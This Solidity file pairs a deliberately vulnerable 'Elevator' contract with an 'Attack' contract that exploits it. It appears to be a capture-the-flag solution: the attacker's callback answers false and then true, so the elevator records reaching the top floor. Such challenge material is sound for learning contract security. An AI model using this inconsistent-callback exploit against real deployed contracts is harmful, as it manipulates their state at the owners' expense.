//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
  function goTo(uint _floor) external;
}

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (!building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Attack{
    address _addr = 0xAF8149b60EAa9807cC10d33f426eAcd3a24DDAF7;
    bool called = false;

    function doStuff() public {
        IElevator(_addr).goTo(2);
    }

    function isLastFloor(uint _floor) public returns (bool){
        if (!called){
            called = true;
            return false;
        } else return true;
    }
}